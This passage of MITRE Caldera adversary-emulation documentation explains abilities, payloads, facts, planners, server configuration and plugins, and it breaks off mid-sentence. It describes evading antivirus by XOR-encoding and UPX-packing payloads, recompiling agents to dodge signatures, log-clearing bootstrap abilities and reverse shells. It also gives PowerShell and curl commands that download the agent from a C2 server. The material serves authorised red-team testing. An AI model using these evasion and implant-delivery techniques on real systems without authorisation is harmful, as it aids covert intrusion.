Payload: A comma-separated list of files which the ability requires in order to run. In the windows executor above, the payload is wifi.ps1. This means, before the ability is used, the agent will download wifi.ps1 from Caldera. If the file already exists, it will not download it. You can store any type of file in the payload directories of any plugin.

Did you know that you can assign functions to execute on the server when specific payloads are requested for download? An example of this is the sandcat.go file. Check the plugins/sandcat/hook.py file to see how special payloads can be handled.

Payloads can be stored as regular files or you can xor (encode) them so the anti-virus on the server-side does not pick them up. To do this, run the app/utility/payload_encoder.py against the file to create an encoded version of it. Then store and reference the encoded payload instead of the original.

The payload_encoder.py file has a docstring which explains how to use the utility.

Payloads also can be ran through a packer to obfuscate them further from detection on a host machine. To do this you would put the packer module name in front of the filename followed by a colon ‘:’. This non-filename character will be passed in the agent’s call to the download endpoint, and the file will be packed before sending it back to the agent. UPX is currently the only supported packer, but adding addition packers is a simple task.

An example for setting up for a packer to be used would be editing the filename in the payload section of an ability file: - upx:Akagi64.exe

Uploads: A list of files which the agent will upload to the C2 server after running the ability command. The filepaths can be specified as local file paths or absolute paths. The ability assumes that these files will exist during the time of upload.

Below is an example ability that uses the uploads keyword:

---

- id: 22b9a90a-50c6-4f6a-a1a4-f13cb42a26fd
  name: Upload file example
  description: Example ability to upload files
  tactic: exfiltration
  technique:
    attack_id: T1041
    name: Exfiltration Over C2 Channel
  platforms:
    darwin,linux:
      sh:
        command: |
          echo "test" > /tmp/absolutepath.txt;
          echo "test2" > ./localpath.txt;
        cleanup: |
          rm -f /tmp/absolutepath.txt ./localpath.txt;
        uploads:
          - /tmp/absolutepath.txt
          - ./localpath.txt
Cleanup: An instruction that will reverse the result of the command. This is intended to put the computer back into the state it was before the ability was used. For example, if your command creates a file, you can use the cleanup to remove the file. Cleanup commands run after an operation, in the reverse order they were created. Cleaning up an operation is also optional, which means you can start an operation and instruct it to skip all cleanup instructions.

Cleanup is not needed for abilities, like above, which download files through the payload block. Upon an operation completing, all payload files will be removed from the client (agent) computers.

Parsers: A list of parsing modules which can parse the output of the command into new facts. Interested in this topic? Check out how Caldera parses facts, which goes into detail about parsers.

Abilities can also make use of two Caldera REST API endpoints, file upload and download.

Requirements: Required relationships of facts that need to be established before this ability can be used. See Requirements for more information.

Timeout: How many seconds to allow the command to run.

Bootstrap and Deadman Abilities
Bootstrap Abilities are abilities that run immediately after sending their first beacon in. A bootstrap ability can be added through the GUI by entering the ability id into the ‘Bootstrap Abilities’ field in the ‘Agents’ tab. Alternatively, you can edit the conf/agents.yml file and include the ability id in the bootstrap ability section of the file (ensure the server is turned off before editing any configuration files).

Deadman Abilities are abilities that an agent runs just before graceful termination. When the Caldera server receives an initial beacon from an agent that supports deadman abilities, the server will immediately send the configured deadman abilities, along with any configured bootstrap abilities, to the agent. The agent will save the deadman abilities and execute them if terminated via the GUI or if self-terminating due to watchdog timer expiration or disconnection from the C2. Deadman abilities can be added through the GUI by entering a comma-separated list of ability IDs into the ‘Deadman Abilities’ field in the ‘Agents’ tab. Alternatively, you can edit the ‘conf/agents.yml’ file and include the ability ID in the ‘deadman_abilities’ section of the file (ensure the server is turned off before editing any configuration files).

Below is an example conf/agents.yml file with configured bootstrap and deadman abilities:

bootstrap_abilities:
- 43b3754c-def4-4699-a673-1d85648fda6a # Clear and avoid logs
deadman_abilities:
- 5f844ac9-5f24-4196-a70d-17f0bd44a934 # delete agent executable upon termination
implant_name: splunkd
sleep_max: 60
sleep_min: 30
untrusted_timer: 90
watchdog: 0
deployments:
  - 2f34977d-9558-4c12-abad-349716777c6b #Sandcat
  - 356d1722-7784-40c4-822b-0cf864b0b36d #Manx
  - 0ab383be-b819-41bf-91b9-1bd4404d83bf #Ragdoll
Adversary Profiles
The majority of adversary profiles are stored inside the Stockpile plugin (plugins/stockpile/data/adversaries). Adversary profiles created through the UI will be placed in data/adversaries.

Adversaries consist of an objective (optional) and a list of abilities under atomic_ordering. This ordering determines the order in which abilities will be run.

An example adversary is below:

id: 5d3e170e-f1b8-49f9-9ee1-c51605552a08
name: Collection
description: A collection adversary
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
    - 1f7ff232-ebf8-42bf-a3c4-657855794cfe #find company emails
    - d69e8660-62c9-431e-87eb-8cf6bd4e35cf #find ip addresses
    - 90c2efaa-8205-480d-8bb6-61d90dbaf81b #find sensitive files
    - 6469befa-748a-4b9c-a96d-f191fde47d89 #create staging dir
Operations
An operation can be started with a number of optional configurations:

Group: Which collection of agents would you like to run against

Adversary: Which adversary profile would you like to run

Auto-close: Automatically close the operation when there is nothing left to do. Alternatively, keep the operation forever.

Run immediately: Run the operation immediately or start in a paused state

Autonomous: Run autonomously or manually. Manual mode will ask the operator to approve or discard each command.

Planner: You can select which logic library - or planner - you would like to use.

Fact source: You can attach a source of facts to an operation. This means the operation will start with “pre-knowledge” of the facts, which it can use to fill in variables inside the abilities.

Cleanup timeout: How many seconds to wait for each cleanup command to complete before continuing.

Obfuscators: Select an obfuscator to encode each command with, before they are sent to the agents.

Jitter: Agents normally check in with Caldera every 60 seconds. Once they realize they are part of an active operation, agents will start checking in according to the jitter time, which is by default 2/8. This fraction tells the agents that they should pause between 2 and 8 seconds (picked at random each time an agent checks in) before using the next ability.

Visibility: How visible should the operation be to the defense. Defaults to 51 because each ability defaults to a visibility of 50. Abilities with a higher visibility than the operation visibility will be skipped.

After starting an operation, users can export the operation report in JSON format by clicking the “Download report” button in the operation GUI modal. For more information on the operation report format, see the Operation Result section.

Facts
A fact is an identifiable piece of information about a given computer. Facts can be used to perform variable assignment within abilities.

Facts are composed of the following:

name: a descriptor which identifies the type of the fact and can be used for variable names within abilities. Example: host.user.name. Note that Caldera 3.1.0 and earlier required fact names/traits to be formatted as major.minor.specific but this is no longer a requirement.

value: any arbitrary string. An appropriate value for a host.user.name may be “Administrator” or “John”.

score: an integer which associates a relative importance for the fact. Every fact, by default, gets a score of 1. If a host.user.password fact is important or has a high chance of success if used, you may assign it a score of 5. When an ability uses a fact to fill in a variable, it will use those with the highest scores first. If a fact has a score of 0, it will be blocklisted - meaning it cannot be used in the operation.

If a property has a prefix of host. (e.g., host.user.name) you can ensure that the fact will only be used by the host that collected it if you add the plugins.stockpile.app.requirements.paw_provenance requirement to the ability using the fact.

As hinted above, when Caldera runs abilities, it scans the command and cleanup instructions for variables. When it finds one, it then looks at the facts it has and sees if it can replace the variables with matching facts (based on the property). It will then create new variants of each command/cleanup instruction for each possible combination of facts it has collected. Each variant will be scored based on the cumulative score of all facts inside the command. The highest scored variants will be executed first.

Facts can be added or modified through the GUI by navigating to Advanced -> Sources and clicking on ‘+ add row’.

Fact sources
A fact source is a collection of facts that you have grouped together. A fact source can be applied to an operation when you start it, which gives the operation facts to fill in variables with.

Fact sources can be added or modified through the GUI by navigating to Advanced -> Sources.

Rules
A rule is a way of restricting or placing boundaries on Caldera. Rules are directly related to facts and should be included in a fact sheet.

Rules act similar to firewall rules and have three key components: fact, action, and match

Fact specifies the name of the fact that the rule will apply to

Action (ALLOW, DENY) will allow or deny the fact from use if it matches the rule

Match regex rule on a fact’s value to determine if the rule applies

During an operation, the planning service matches each link against the rule-set, discarding it if any of the fact assignments in the link match a rule specifying DENY and keeping it otherwise. In the case that multiple rules match the same fact assignment, the last one listed will be given priority.

Example

rules:
  - action: DENY
    fact: file.sensitive.extension
    match: .*
  - action: ALLOW
    fact: file.sensitive.extension
    match: txt
In this example only the txt file extension will be used. Note that the ALLOW action for txt supersedes the DENY for all, as the ALLOW rule is listed later in the policy. If the ALLOW rule was listed first, and the DENY rule second, then all values (including txt) for file.sensitive.extension would be discarded.

Subnets
Rules can also match against subnets.

Subnet Example

  - action: DENY
    fact: my.host.ip
    match: .*
  - action: ALLOW
    fact: my.host.ip
    match: 10.245.112.0/24
In this example, the rules would permit Caldera to only operate within the 10.245.112.1 to 10.245.112.254 range.

Rules can be added or modified through the GUI by navigating to Advanced -> Sources and clicking on ‘+ view rules’.

Fact Source Adjustments
Fact source adjustments allow for dynamic adjustment specific ability’s visibility in the context of an operation.

Adjustment Example (basic fact source)

  adjustments:
    1b4fb81c-8090-426c-93ab-0a633e7a16a7:
      host.installed.av:
        - value: symantec
          offset: 3
        - value: mcafee
          offset: 3
In this example, if in the process of executing an operation, a host.installed.av fact was found with either the value symantec or mcafee, ability 1b4fb81c-8090-426c-93ab-0a633e7a16a7 (Sniff network traffic) would have its visibility score raised and the status HIGH_VIZ. This framework allows dynamic adjustments to expected ability visibility based on captured facts (in this example the presence of anti-virus software on the target) which may impact our desire to run the ability, as it might be more easily detected in this environment.

When the “Sniff network traffic” ability is run, its visibility is only adjusted if, at the time of execution, the fact source has a host.installed.av fact with either the value symantec or mcafee. If one or both of these facts are present, each execution of “Sniff network traffic” will have 3 (the value of it’s offset) added to its visibility score. This visibility adjustment is recorded in the operation report.

Adjustments must be added or modified through the fact source’s .yml file, with the exception of new fact sources created using the REST API’s sources endpoint with a well-formed PUT request.

Planners
A planner is a module within Caldera which contains logic for how a running operation should make decisions about which abilities to use and in what order.

Planners are single module Python files. Planners utilize the core system’s planning_svc.py, which has planning logic useful for various types of planners.

The Atomic planner
Caldera ships with a default planner, atomic. The atomic planner operates by atomically sending a single ability command to each agent in the operation’s group at a time, progressing through abilities as they are enumerated in the underlying adversary profile. When a new agent is added to the operation, the atomic planner will start with the first ability in the adversary profile.

The atomic planner can be found in the mitre/stockpile GitHub repository at app/atomic.py.

Custom Planners
For any other planner behavior and functionality, a custom planner is required. Caldera has open sourced some custom planners, to include the batch and buckets planners. From time to time, the Caldera team will open source further planners as they become more widely used, publicly available, etc.

The batch planner will retrieve all ability commands available and applicable for the operation and send them to the agents found in the operation’s group. The batch planner uses the planning service to retrieve ability commands based on the chosen advsersary and known agents in the operation. The abilities returned to the batch planner are based on the agent matching the operating system (execution platform) of the ability and the ability command having no unsatisfied facts. The batch planner will then send these ability commands to the agents and wait for them to be completed. After each batch of ability commands is completed, the batch planner will again attempt to retrieve all ability commands available for the operation and attempt to repeat the cycle. This is required as once ability commands are executed, new additional ability commands may also become unlocked; e.g. required facts being present now, newly spawned agents, etc. The batch planner should be used for profiles containing repeatable abilities.

The buckets planner is an example planner to demonstrate how to build a custom planner as well as the planning service utilities available to planners to aid in the formation decision logic.

The batch and buckets planners can be found in the mitre/stockpile github repository at app/batch.py and app/buckets.py.

See How to Build Planners for full walkthrough of how to build a custom planner and incorporate any custom decision logic that is desired.

Repeatable Abilities and Planners
When creating a new operation, selecting a profile with repeatable abilities will disable both the atomic and the buckets planners. Due to the behavior and functionality of these planners, repeatable abilities will result in the planner looping infinitely on the repeatable ability. It is recommended to use the batch planner with profiles containing repeatable abilities.

Plugins
Caldera is built using a plugin architecture on top of the core system. Plugins are separate git repositories that plug new features into the core system. Each plugin resides in the plugins directory and is loaded into Caldera by adding it to the local.yml file.

Plugins can be added through the UI or in the configuration file (likely conf/local.yml). Changes to the configuration file while the server is shut down. The plugins will be enabled when the server restarts.

Each plugin contains a single hook.py file in its root directory. This file should contain an initialize function, which gets called automatically for each loaded plugin when Caldera boots. The initialize function contains the plugin logic that is getting “plugged into” the core system. This function takes a single parameter:

services: a list of core services that live inside the core system.

A plugin can add nearly any new functionality/features to Caldera by using the two objects above.

A list of plugins included with Caldera can be found on the Plugin library page.


# Server Configuration

## Startup parameters

`server.py` supports the following arguments:

- `--log {DEBUG,INFO,WARNING,ERROR,CRITICAL}`: Sets the log option. The `DEBUG` option is useful for troubleshooting.
- `--fresh`: Resets all non-plugin data including custom abilities and adversaries, operations, and the agent list.
  A gzipped, tarball backup of the original content is stored in the `data/backup` directory. This makes it possible to 
  recover the server state after an accidental `--fresh` startup by running `tar -zxvf data/backup/backup-<timestamp>.tar.gz`
  from the root caldera directory before server startup.
- `--environment ENVIRONMENT`: Sets a custom configuration file. See "Custom configuration files" below for additional details.
- `--plugins PLUGINS`: Sets Caldera to run only with the specified plugins
- `--insecure`: Uses the `conf/default.yml` file for configuration, not recommended.

## Configuration file

Caldera's configuration file is located at `conf/local.yml`, written on the first run. If the server is run with the `--insecure` option (not recommended), Caldera will use the file located at `conf/default.yml`.

Configuration file changes must be made while the server is shut down. Any changes made to the configuration file while the server is running will be overwritten.

The value set for `app.frontend.api_base_url` is used to configure the Caldera v5 Vue UI when the Caldera server is started with the `--build` flag. It has been observed that in some situations the default configuration values can cause the UI to appear unresponsive due to misrouted requests. This mainly occurs when the server is running on a host different than the UI is being accessed from. In these cases, the value should be changed to the appropriate URL for the UI to route requests to.

The YAML configuration file contains all the configuration variables Caldera requires to boot up and run. A documented configuration file is below:

```yaml
ability_refresh: 60  # Interval at which ability YAML files will refresh from disk 
api_key_blue: BLUEADMIN123  # API key which grants access to Caldera blue
api_key_red: ADMIN123  # API key which grants access to Caldera red
app.contact.dns.domain: mycaldera.caldera  # Domain for the DNS contact server
app.contact.dns.socket: 0.0.0.0:53  # Listen host and port for the DNS contact server
app.contact.gist: API_KEY  # API key for the GIST contact
app.contact.html: /weather  # Endpoint to use for the HTML contact
app.contact.http: http://0.0.0.0:8888  # Server to connect to for the HTTP contact
app.contact.tcp: 0.0.0.0:7010  # Listen host and port for the TCP contact server
app.contact.udp: 0.0.0.0:7011  # Listen host and port for the UDP contact server
app.contact.websocket: 0.0.0.0:7012  # Listen host and port for the Websocket contact server
app.frontend.api_base_url: http://localhost:8888
objects.planners.default: atomic  # Specify which planner should be used by default (works for all objects, just replace `planners` with the appropriate object type name)
crypt_salt: REPLACE_WITH_RANDOM_VALUE  # Salt for file encryption
encryption_key: ADMIN123  # Encryption key for file encryption
exfil_dir: /tmp  # The directory where files exfiltrated through the /file/upload endpoint will be stored
host: 0.0.0.0  # Host the server will listen on 
plugins:  # List of plugins to enable
- access
- atomic
- compass
- debrief
- fieldmanual
- gameboard
- manx
- response
- sandcat
- stockpile
- training
port: 8888  # Port the server will listen on
reports_dir: /tmp  # The directory where reports are saved on server shutdown
auth.login.handler.module: default  # Python import path for auth service login handler ("default" will use the default handler)
requirements:  # Caldera requirements
  go:
    command: go version
    type: installed_program
    version: 1.11
  python:
    attr: version
    module: sys
    type: python_module
    version: 3.8.0
users:  # User list for Caldera blue and Caldera red
  blue:
    blue: admin  # Username and password
  red:
    admin: admin
    red: admin
```

## Custom configuration files

Custom configuration files can be created with a new file in the `conf/` directory. The name of the config file can then be specified with the `-E` flag when starting the server.

Caldera will choose the configuration file to use in the following order:

1. A config specified with the `-E` or `--environment` command-line options.  For instance, if started with `python caldera.py -E foo`, Caldera will load it's configuration from `conf/foo.yml`.
2. `conf/local.yml`: Caldera will prefer the local configuration file if no other options are specified.
3. `conf/default.yml`: If no config is specified with the `-E` option and it cannot find a `conf/local.yml` configuration file, Caldera will use its default configuration options.

## Enabling LDAP login

Caldera can be configured to allow users to log in using LDAP. To do so add an `ldap` section to the config with the following fields:

* **dn**: the base DN under which to search for the user
* **server**: the URL of the LDAP server, optionally including the scheme and port
* **user_attr**: the name of the attribute on the user object to match with the username, e.g. `cn` or `sAMAccountName`. Default: `uid`
* **group_attr**: the name of the attribute on the user object to match with the group, e.g. `MemberOf` or `group`. Default: `objectClass`
* **red_group**: the value of the group_attr that specifies a red team user. Default: `red`

For example: 

```yaml
ldap:
  dn: cn=users,cn=accounts,dc=demo1,dc=freeipa,dc=org
  server: ldap://ipa.demo1.freeipa.org
  user_attr: uid
  group_attr: objectClass
  red_group: organizationalperson
```

This will allow the `employee` user to log in as `uid=employee,cn=users,cn=accounts,dc=demo1,dc=freeipa,dc=org`. This
user has an `objectClass` attribute that contains the value `organizationalperson`, so they will be logged in as a red
team user. In contrast, the `admin` user does not have an `objectClass` of `organizationalperson` so they will be logged
in as a blue team user.

Be sure to change these settings to match your specific LDAP environment.

Note that adding the `ldap` section will disable any accounts listed in the `users` section of the config file;
only LDAP will be used for logging in.

## Setting Custom Login Handlers
By default, users authenticate to Caldera by providing credentials (username and password) in the main login page.
These credentials are verified using Caldera's internal user mapping, or via LDAP if LDAP login is enabled for Caldera.
If users want to use a different login handler, such as one that handles SAML authentication or a login handler provided
by a Caldera plugin, the `auth.login.handler.module` keyword in the Caldera configuration file
must be changed from its value of `default`, which is used to load the default login handler.
The configuration value, if not `default`, must be a Python import path string corresponding to the custom login handler relative to the main Caldera directory (e.g. `auth.login.handler.module: plugins.customplugin.app.my_custom_handler`). 
If the keyword is not provided, the default login handler will be used.

The Python module referenced in the configuration file must implement the following method:
```python
def load_login_handler(services):
    """Return Python object that extends LoginHandlerInterface from app.service.interfaces.i_login_handler"""
    pass
```

When loading custom login handlers, Caldera expects the referenced Python module to return an object that extends
`LoginHandlerInterface` from `app.service.interfaces.i_login_handler`. This interface provides all of the methods
that Caldera's authentication service requires to handle logins. If an invalid login handler is referenced in
the configuration file, then the server will exit with an error.

An example login handler Python module may follow the following structure:
```python
from app.service.interfaces.i_login_handler import LoginHandlerInterface

HANDLER_NAME = 'My Custom Login Handler'

def load_login_handler(services):
    return CustomLoginHandler(services, HANDLER_NAME)

class CustomLoginHandler(LoginHandlerInterface):
    def __init__(self, services, name):
        super().__init__(services, name)

    async def handle_login(self, request, **kwargs):
        # Handle login
        pass

    async def handle_login_redirect(self, request, **kwargs):
        # Handle login redirect
        pass
```

# Plugin library

Here you'll get a run-down of all open-source plugins, all of which can be found in the plugins/ directory as separate 
GIT repositories. 

To enable a plugin, add it to the `default.yml` file in the `conf/` directory. Make sure your server is stopped when editing the `default.yml` file.

Plugins can also be enabled through the GUI. Go to *Advanced -> Configuration* and then click on the 'enable' button for the plugin you would like to enable.

## Sandcat

The Sandcat plugin contains Caldera's default agent, which is written in GoLang for
cross-platform compatibility. 

The agent will periodically beacon to the C2 server to receive instructions, execute instructions
on the target host, and then send results back to the C2 server.
The agent also supports payload downloads, file uploads, and a variety of execution and C2 communication options.
For more details, see the [Sandcat plugin documentation](plugins/sandcat/Sandcat-Details.md)

### Deploy 

To deploy Sandcat, use one of the built-in delivery commands which allows you to run the agent on any operating system. 
Each of these commands downloads the compiled Sandcat executable from Caldera and runs it immediately. Find
the commands on the Sandcat plugin tab.

Once the agent is running, it should show log messages when it beacons into Caldera.

> If you have GoLang installed on the Caldera server, each time you run one of the delivery commands above, 
the agent will re-compile itself dynamically and it will change it's source code so it gets a different file 
hash (MD5) and a random name that blends into the operating system. This will help bypass file-based signature detections.

### Options

When deploying a Sandcat agent, there are optional parameters you can use when you start the executable:

* **Server**: This is the location of Caldera. The agent must have connectivity to this host/port. 
* **Group**: This is the group name that you would like the agent to join when it starts. The group does not have to exist. A default group of my_group will be used if none is passed in.
* **v**: Use `-v` to see verbose output from sandcat.  Otherwise, sandcat will run silently.

### Extensions
In order to keep the agent code lightweight, the default Sandcat agent binary ships with limited basic functionality.
Users can dynamically compile additional features, referred to as "gocat extensions". Each extension adds to the 
existing `gocat` module code to provide functionality such as peer-to-peer proxy implementations, additional
executors, and additional C2 contact protocols. 

To request particular gocat extensions, users can 
include the `gocat-extensions` HTTP header when asking the C2 to compile an agent. The header value
must be a comma-separated list of requested extensions. The server will include the extensions in
the binary if they exist and if their dependencies are met (i.e. if extension A requires a particular
Golang module that is not installed on the server, then extension A will not be included).

Below is an example powershell snippet to request the C2 server to include the `proxy_http` and `shells` 
extensions:
```
$url="http://192.168.137.1:8888/file/download"; # change server IP/port as needed
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows"); # specifying Windows build
$wc.Headers.add("file","sandcat.go"); # requesting sandcat binary
$wc.Headers.add("gocat-extensions","proxy_http,shells"); # requesting the extensions
$output="C:\Users\Public\sandcat.exe"; # specify destination filename
$wc.DownloadFile($url,$output); # download
```

The following features are included in the stock agent:
- `HTTP` C2 contact protocol
- `psh` PowerShell executor (Windows)
- `cmd` cmd.exe executor (Windows)
- `sh` shell executor (Linux/Mac)
- `proc` executor to directly spawn processes from executables without needing to invoke a shell (Windows/Linux/Mac)

Additional functionality can be found in the following gocat extensions:
- `gist` extension provides the Github gist C2 contact protocol.
- `shells` extension provides the `osascript` (Mac Osascript) and `pwsh` (Windows powershell core) executors.
- `shellcode` extension provides the shellcode executors.
- `proxy_http` extension provides the `HTTP` peer-to-peer proxy receiver.
- `proxy_smb_pipe` extension provides the `SmbPipe` peer-to-peer proxy client and receiver for Windows (peer-to-peer
communication via SMB named pipes).
- `donut` extension provides the Donut functionality to execute various assemblies in memory. 
See https://github.com/TheWover/donut for additional information.
- `shared` extension provides the C sharing functionality for Sandcat.

#### Exit Codes

Exit codes returned from Sandcat vary across executors. Typical shell executors will return the exit code provided by the shell. Certain executor extensions will return values hard-coded in Sandcat.

Sandcat includes general exit codes which may be utilized by executors, overriden by executors, or used in error cases. The following values describe general Sandcat exit codes:
- `-1`: Error (e.g., cannot decode command, payload not available)
- `0`: Success

The following values describe exit codes utilized by specific executors:
- `shells`: Returns the exit code provided by the OS/shell.
- `shellcode`: Utilizes the general Sandcat exit codes.
- `native` and `native_aws`:
    - `0`: Success
    - `1`: Process error (e.g., error while executing code)
    - `2`: Input error (e.g., invalid parameters)
- `donut`: Returns the exit code provided by the OS/shell.

#### Customizing Default Options & Execution Without CLI Options

It's possible to customize the default values of these options when pulling Sandcat from the Caldera server.  
This is useful if you want to hide the parameters from the process tree. You can do this by passing the values
in as headers instead of as parameters.

For example, the following will download a linux executable that will use `http://10.0.0.2:8888` as the server address 
instead of `http://localhost:8888`.

```
curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' -H 'server:http://10.0.0.2:8888' http://localhost:8888/file/download > sandcat.sh
```
## Caldera for OT

The Caldera for OT plugins extend Caldera by providing support for common industrial protocols. Each plugin contains a collection of abilities unique to an operational technology (OT) protocol.
To install the plugins and learn more about which protocols are currently supported, visit: [https://github.com/mitre/caldera-ot](https://github.com/mitre/caldera-ot).

## Mock 

The Mock plugin adds a set of simulated agents to Caldera and allows you to run complete operations without hooking any other computers up to your server. 

These agents are created inside the `conf/agents.yml` file. They can be edited and you can create as many as you'd like. A sample agent looks like:
```
- paw: 1234
  username: darthvader
  host: deathstar
  group: simulation
  platform: windows
  location: C:\Users\Public
  enabled: True
  privilege: User
  c2: HTTP
  exe_name: sandcat.exe
  executors:
    - pwsh
    - psh
```

After you load the mock plugin and restart Caldera, all simulated agents will appear as normal agents in the Chain plugin GUI and can be used in any operation.

## Manx

The terminal plugin adds reverse-shell capability to Caldera, along with a TCP-based agent called Manx.

When this plugin is loaded, you'll get access to a new GUI page which allows you to drop reverse-shells on target hosts 
and interact manually with the hosts. 

You can use the terminal emulator on the Terminal GUI page to interact with your sessions. 

## Stockpile

The stockpile plugin adds a few components to Caldera:

* Abilities
* Adversaries
* Planner
* Facts

These components are all loaded through the `plugins/stockpile/data/*` directory.

## Response

The response plugin is an autonomous incident response plugin, which can fight back against adversaries
on a compromised host.

Similar to the stockpile plugin, it contains adversaries, abilities, and facts intended for incident response. These components are all loaded through the `plugins/response/data/*` directory.

## Compass

Create visualizations to explore TTPs. Follow the steps below to create your own visualization:

1. Click 'Generate Layer'
1. Click '+' to open a new tab in the navigator
1. Select 'Open Existing Layer'
1. Select 'Upload from local' and upload the generated layer file

Compass leverages ATT&CK Navigator, for more information see: [https://github.com/mitre-attack/attack-navigator](https://github.com/mitre-attack/attack-navigator)

## Caltack

The caltack plugin adds the public MITRE ATT&CK website to Caldera. This is useful for deployments of Caldera where an operator cannot access the Internet to reference the MITRE ATT&CK matrix.

After loading this plugin and restarting, the ATT&CK website is available from the Caldera home page. Not all parts of the ATT&CK website will be available - but we aim to keep those pertaining to tactics and techniques accessible.

## SSL

The SSL plugin adds HTTPS to Caldera. 
> This plugin only works if Caldera is running on a Linux or MacOS machine. It requires HaProxy (>= 1.8) to be installed prior to using it.

When this plugin has been loaded, Caldera will start the HAProxy service on the machine and serve Caldera on all interfaces on port 8443, in addition to the normal http://[YOUR_IP]:8888 (based on the value of the `host` value in the Caldera settings).

Plugins and agents will not automatically update to the service at https://[YOUR_IP]:8443. All agents will need to be redeployed using the HTTPS address to use the secure protocol. The address will not automatically populate in the agent deployment menu. If a self-signed certificate is used, deploying agents may require additional commands to disable SSL certificate checks (such as using the `--insecure` flag to bypass SSL certificate checks in the initial `curl` request when downloading the new agents).

**Warning:** This plugin uses a default self-signed ssl certificate and key which should be replaced. In order to use this plugin securely, you need to generate your own certificate. The directions below show how to generate a new self-signed certificate. If you are unable to connect to Caldera using the self-signed certificate, verify that your system trusts the certificate.

### Setup Instructions

*Note: OpenSSL must be installed on your system to generate a new self-signed certificate*

1. install haproxy >= 1.8 using `brew install haproxy` (MacOS) or `sudo apt-get install haproxy` (Linux).
2. In the root Caldera directory, navigate to `plugins/ssl`.
3. Place a PEM file containing SSL public and private keys in `conf/certificate.pem`. Follow the instructions below to generate a new self-signed certificate:
   - In a terminal, paste the command `openssl req -x509 -newkey rsa:4096  -out conf/certificate.pem -keyout conf/certificate.pem -nodes` and press enter.
   - This will prompt you for identifying details. Enter your country code when prompted. You may leave the rest blank by pressing enter.
4. Copy the file `haproxy.conf` from the `templates` directory to the `conf` directory.
5. Open the file `conf/haproxy.conf` in a text editor.
6. On the line `bind *:8443 ssl crt plugins/ssl/conf/insecure_certificate.pem`, replace `insecure_certificate.pem` with `certificate.pem`.
7. On the line `server caldera_main 127.0.0.1:8888 cookie caldera_main`, replace `127.0.0.1:8888` with the host and port defined in Caldera's `conf/local.yml` file. This should not be required if Caldera's configuration has not been changed.
8. Save and close the file. Congratulations! You can now use Caldera securely by accessing the UI https://[YOUR_IP]:8443 and redeploying agents using the HTTPS service.


## Atomic

The Atomic plugin imports all Red Canary Atomic tests from their open-source GitHub repository.

## GameBoard

The GameBoard plugin allows you to monitor both red-and-blue team operations. The game tracks points for both sides
and determines which one is "winning". The scoring seeks to quantify the amount of true/false positives/negatives
produced by the blue team. The blue team is rewarded points when they are able to catch the red team's actions, and the
red team is rewarded when the blue team is not able to correctly do so. Additionally, abilities are rewarded different amounts of
points depending on the tactic they fulfill.

To begin a gameboard exercise, first log in as blue user and deploy an agent. The 'Auto-Collect' operation will execute automatically. Alternatively, you can begin a different operation with the blue agent if you desire. Log in as red user and begin another operation. Open up the gameboard plugin from the GUI and select these new respective red and blue operations to monitor points for each operation. 

## Human

The Human plugin allows you to build "Humans" that will perform user actions on a target system as a means to obfuscate 
red actions by Caldera. Each human is built for a specific operating system and leverages the Chrome browser along with other native 
OS applications to perform a variety of tasks.  Additionally, these humans can have various aspects of their behavior "tuned"
to add randomization to the behaviors on the target system.

On the Caldera server, there are additional python packages required in order to use the Human plugin.
These python packages can be installed by navigating to the `plugins/human/` directory and running the command `pip3 install -r requirements.txt`

With the python package installed and the plugin enabled in the configuration file, the Human plugin is ready for use.
When opening the plugin within Caldera, there are a few actions that the human can perform.
Check the box for each action you would like the human to perform. 
Once the actions are selected, then "Generate" the human.

The generated human will show a deployment command for how to run it on a target machine.
Before deploying the human on a target machine, there are 3 requirements:

1. Install python3 on the target machine
2. Install the python package `virtualenv` on the target machine
3. Install Google Chrome on the target machine

Once the requirements above are met, then copy the human deployment command from the Caldera server and run it on the target machine.
The deployment command downloads a tar file from the Caldera server, un-archives it, and starts the human using python.
The human runs in a python virtual environment to ensure there are no package conflicts with pre-existing packages.

## Training

This plugin allows a user to gain a "User Certificate" which proves their ability to use Caldera. This is the first of several certificates planned in the future. The plugin takes you through a capture-the-flag style certification course, covering all parts Caldera.

## Access

This plugin allows you to task any agent with any ability from the database. It also allows you to conduct [Initial Access Attacks](Initial-Access-Attacks.md).

### Metasploit Integration

The Access plugin also allows for the easy creation of abilities for Metasploit exploits.

Prerequisites:

* An agent running on a host that has Metasploit installed and initialized (run it once to set up Metasploit's database)
* The `app.contact.http` option in Caldera's configuration includes `http://`
* A fact source that includes a `app.api_key.red` fact with a value equal to the `api_key_red` option in Caldera's configuration

Within the `build-capabilities` tactic there is an ability called `Load Metasploit Abilities`. Run this ability with an agent and fact source as described above, which will add a new ability for each Metasploit exploit. These abilities can then be found under the `metasploit` tactic. Note that this process may take 15 minutes.

If the exploit has options you want to use, you'll need to customize the ability's `command` field. Start an operation in `manual` mode, and modify the `command` field before adding the potential link to the operation. For example, to set `RHOSTS` for the exploit, modify `command` to include `set RHOSTS <MY_RHOSTS_VALUE>;` between `use <EXPLOIT_NAME>;` and `run`.

Alternatively, you can set options by adding a fact for each option with the `msf.` prefix. For example, to set `RHOST`, add a fact called `msf.RHOST`. Then in the ability's `command` field add `set RHOSTS \#{msf.RHOSTS};` between `use <EXPLOIT_NAME>;` and `run`.

## Builder

The Builder plugin enables Caldera to dynamically compile code segments into payloads that can be executed as abilities by implants. Currently, only C# is supported. 

See [Dynamically-Compiled Payloads](Dynamically-Compiled-Payloads.md) for examples on how to create abilities that leverage these payloads.

## Debrief

The Debrief plugin provides a method for gathering overall campaign information and analytics for a selected set of operations. It provides a centralized view of operation metadata and graphical displays of the operations, the techniques and tactics used, and the facts discovered by the operations. 

The plugin additionally supports the export of campaign information and analytics in PDF format.

# Parsers

Caldera uses parsers to extract facts from command output. A common use case is to allow
operations to take gathered information and feed it into future abilities and decisions -
for example, a discovery ability that looks for sensitive files can output file paths, which
will then be parsed into file path facts, and a subsequent ability can use those file paths
to stage the sensitive files in a staging directory.

Parsers can also be used to create facts with relationships linked between them - this allows
users to associate facts together, such as username and password facts. 

Under the hood, parsers are python modules that get called when the agent sends command output 
to the Caldera server and certain conditions are met:
- If the corresponding ability has a specified parser associated with the command, 
the parser module will be loaded and used to parse out any facts from the output.
This will occur even if the agent ran the command outside of an operation
- If the agent ran the command as part of an operation, but the corresponding ability does not 
have any specified parsers associated with the command, Caldera will check if the operation
was configured to use default parsers. If so, any default parsers loaded within Caldera will
be used to parse out facts from the output. Otherwise, no parsing occurs.
- If the agent ran the command outside of an operation, but the corresponding ability does not
